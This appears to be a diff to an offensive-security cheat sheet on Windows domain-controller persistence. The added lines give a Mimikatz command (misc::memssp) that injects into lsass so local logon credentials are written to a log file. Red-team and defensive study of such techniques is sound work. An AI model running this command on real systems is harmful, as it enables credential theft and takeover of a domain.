@@ -353,3 +353,16 @@ $packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig
 
 - Using mimikatz, inject into lsass (Not super stable with Server 2019 and Server 2022 but still usable):
 
+```powershell
+Invoke-Mimikatz -Command '"misc::memssp"'
+```
+
+All local logons on the DC are now logged to `C:\Windows\system32\mimilsa.log`
+
+
+![](https://i.imgur.com/87AenfB.png)
+
+
+
+
+
